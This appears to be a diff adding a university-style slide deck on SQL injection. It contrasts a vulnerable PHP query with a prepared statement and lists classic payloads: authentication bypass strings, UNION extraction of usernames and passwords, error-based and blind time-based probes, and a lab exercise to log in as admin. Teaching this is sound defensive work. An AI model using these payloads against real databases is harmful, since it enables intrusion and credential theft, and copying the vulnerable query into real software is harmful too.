@@ -1,0 +1,54 @@
+COURSE: Web Application Security Fundamentals
+WEEK 2 — SQL Injection & Database Attacks
+INSTRUCTOR: Prof. David Reeves
+SLIDE DECK: Week 2 / Lecture 1
+=========================================================
+
+SLIDE 1: What is SQL Injection?
+---------------------------------------
+SQL Injection occurs when user-supplied input is embedded directly into
+a database query without proper sanitization, allowing attackers to
+modify the query structure.
+
+Impact:
+  - Authentication bypass
+  - Exfiltration of sensitive data
+  - Remote code execution via INTO OUTFILE / xp_cmdshell
+  - Full database destruction (DROP TABLE)
+
+SLIDE 2: Vulnerable vs Safe Code
+---------------------------------------
+VULNERABLE (PHP + MySQL):
+  $query = "SELECT * FROM users WHERE username='$_GET[user]'";
+
+SAFE (Prepared Statement):
+  $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+  $stmt->execute([$_GET['user']]);
+
+SLIDE 3: Classic Payloads
+---------------------------------------
+Authentication bypass:
+  admin'--
+  ' OR '1'='1
+  ' OR 1=1--
+
+UNION extraction:
+  ' UNION SELECT null, username, password FROM users--
+
+Error-based:
+  ' AND extractvalue(1,concat(0x7e,version()))--
+
+SLIDE 4: Blind SQLi Techniques
+---------------------------------------
+Boolean-based:
+  ' AND SUBSTRING(password,1,1)='a'--   (true/false response)
+
+Time-based:
+  ' AND SLEEP(5)--                       (delay = condition true)
+
+SLIDE 5: Lab Exercise
+---------------------------------------
+Target: /login?user=...&pass=...
+Goal: Login as admin without knowing the password.
+
+Document your payload and the data you extracted.
